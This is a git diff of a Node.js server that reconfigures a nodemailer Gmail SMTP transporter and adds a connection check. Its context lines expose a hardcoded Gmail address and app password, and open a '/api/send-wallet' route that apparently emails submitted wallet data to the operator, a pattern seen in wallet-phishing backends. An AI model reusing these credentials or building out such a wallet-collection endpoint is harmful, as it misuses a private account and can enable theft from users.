@@ -16,12 +16,22 @@ const fromEmail = 'anabeljhonny10@gmail.com';
 const pass = 'mgkwcvqeuruxkedz';
 
 const transporter = nodemailer.createTransport({
-    service: 'gmail',
+    host: 'smtp.gmail.com',
+    port: 587,
+    secure: false,
     auth: {
       user: fromEmail,
       pass: pass,
     },
   });
+
+transporter.verify((error, success) => {
+    if (error) {
+        console.log('Error with email configuration:', error);
+    } else {
+        console.log('Server is ready to take our messages');
+    }
+});
   
 
 app.post('/api/send-wallet', async (req, res) => {
